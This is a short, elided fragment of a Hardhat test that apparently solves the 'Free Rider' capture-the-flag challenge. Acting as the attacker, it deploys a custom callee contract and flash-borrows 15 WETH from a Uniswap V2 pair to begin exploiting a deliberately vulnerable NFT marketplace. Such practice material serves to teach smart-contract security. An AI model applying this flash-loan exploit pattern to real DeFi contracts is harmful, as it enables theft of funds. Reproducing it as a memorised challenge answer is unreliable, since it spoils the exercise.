...
describe('[Challenge] Free Rider', function () {
    ...
    it('Exploit', async function () {
        ...
        const FreeRiderSwapV2CalleeFactory = await ethers.getContractFactory('FreeRiderSwapV2Callee', attacker);
        let SwapCallee = await FreeRiderSwapV2CalleeFactory.deploy(
            this.weth.address, 
        ...
        await this.uniswapPair.connect(attacker).swap(
            ethers.utils.parseEther("15"),                ////amount0Out; WETH ; borrow as nft price
            0,                                             ////amount1out; DVT
            SwapCallee.address,                            ////FlashLoan receiver
